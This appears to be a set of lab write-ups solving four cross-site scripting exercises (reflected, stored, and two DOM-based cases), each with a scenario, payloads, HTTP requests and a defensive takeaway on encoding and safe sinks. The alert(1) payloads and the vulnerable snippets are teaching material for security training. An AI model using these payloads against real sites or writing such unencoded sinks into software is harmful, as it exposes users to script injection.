### [PS-XSS-01] Reflected XSS into HTML context with nothing encoded

**Scenario:** The application's search function accepts user input via a URL query parameter and reflects it directly into the HTML response body without any sanitization or output encoding, allowing an attacker to execute arbitrary JavaScript in the victim's browser.

**Solution:**

1. Input a standard XSS payload into the search box on the home page and submit the search query.
2. Intercept or view the resulting HTTP request in Burp Repeater:

```http
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

3. Inspect the server's HTML response to confirm that the input is reflected raw inside the body context:

```html
<h1>0 search results for '<script>alert(1)</script>'</h1>

```

4. Render the page in a browser to confirm that the script executes and triggers the `alert(1)` pop-up.

> **Key Takeaway:** Reflected XSS in HTML context occurs when untrusted user input is echoed directly into the HTML response stream without context-aware output encoding. All user-supplied data reflected in HTML must undergo context-appropriate encoding (such as converting `<` to `&lt;` and `>` to `&gt;`).

---

### [PS-XSS-02] Stored XSS into HTML context with nothing encoded

**Scenario:** The application's blog comment functionality stores user input directly in a database and renders it into the HTML body context when the blog post is viewed. Because no sanitization or output encoding is performed, the injected script persists on the server and automatically executes in the browser of anyone who views the comment.

**Solution:**

1. Navigate to any blog post on the target site.
2. Scroll to the **Leave a comment** section at the bottom of the page.
3. Enter an XSS payload in the **Comment** text area:

```html
<script>alert(1)</script>

```

4. Fill in the required **Name**, **Email**, and **Website** fields with arbitrary values.
5. Click **Post comment**.
6. Click **Back to blog** or reload the blog post page. The application fetches the stored comment from the database and executes the script, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Stored (persistent) XSS is self-contained within the web application and executes automatically whenever a victim encounters the stored data. All user-controlled input stored in persistent storage must undergo strict context-appropriate encoding (such as HTML entity encoding) before being rendered back to users.

---

### [PS-XSS-03] DOM XSS in document.write sink using source location.search

**Scenario:** The application contains a DOM-based cross-site scripting vulnerability in its search functionality. Client-side JavaScript retrieves data from an untrusted source (`location.search`) and passes it directly into a dangerous sink (`document.write`) without sanitization or escaping.

**Solution:**

1. Enter an arbitrary search string (e.g., `test`) in the search box on the home page.
2. Open Browser Developer Tools (F12) or inspect the page source to analyze how the search query is handled client-side.
3. Locate the inline script executing the search tracking logic:

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);
}

```

4. Observe that `query` is taken directly from the `search` parameter in `location.search` and interpolated inside an `<img>` tag written via `document.write()`.
5. Craft a payload to break out of the `src` attribute and `<img>` tag, then execute arbitrary JavaScript:

```html
"><script>alert(1)</script>

```

6. Submit the payload in the search box or append it to the query string in the browser address bar:

```http
GET /?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

7. When the script evaluates, `document.write()` outputs `<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">`, triggering the `alert(1)` pop-up.

> **Key Takeaway:** DOM XSS occurs entirely within the client-side browser environment when untrusted attacker-controlled sources (such as `location.search`, `location.hash`, or `document.referrer`) reach execution sinks like `document.write()`, `innerHTML`, or `eval()`. Safe development practices require avoiding dynamic code evaluation sinks and utilizing safer DOM manipulation methods such as `textContent` or `createElement()`.

---

### [PS-XSS-04] DOM XSS in innerHTML sink using source location.search

**Scenario:** The application processes user-supplied search queries client-side by assigning data retrieved from `location.search` directly into an `innerHTML` sink. Because `innerHTML` does not execute `<script>` tags in modern browsers (per HTML5 spec), an attacker must use an element with an inline event handler (such as `<img src=x onerror=alert(1)>`) to achieve code execution.

**Solution:**

1. Submit an arbitrary search query (e.g., `test`) on the blog page.
2. Open Browser Developer Tools (F12) and inspect the search results element to analyze the client-side JavaScript:

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    doSearchQuery(query);
}

```

3. Note that `query` is taken directly from the URL's `search` parameter (`location.search`) and written to the DOM via `.innerHTML`.
4. Craft an XSS payload using an `<img>` tag with an invalid `src` and an `onerror` event handler:

```html
<img src=x onerror=alert(1)>

```

5. Submit the payload into the search box or append it directly to the URL query string:

```http
GET /?search=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
Host: target.web-security-academy.net

```

6. The JavaScript assigns the payload to `innerHTML`, inserting the `<img>` element into the page. When the browser attempts to load image source `x`, it fails and fires the `onerror` event, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Assigning untrusted input to an `innerHTML` sink allows DOM XSS. Even though modern browsers block standard `<script>` tag execution when inserted via `innerHTML`, attackers easily bypass this by leveraging inline event handlers like `onerror` or `onload`. Use safer properties like `textContent` or `innerText` to safely render user text.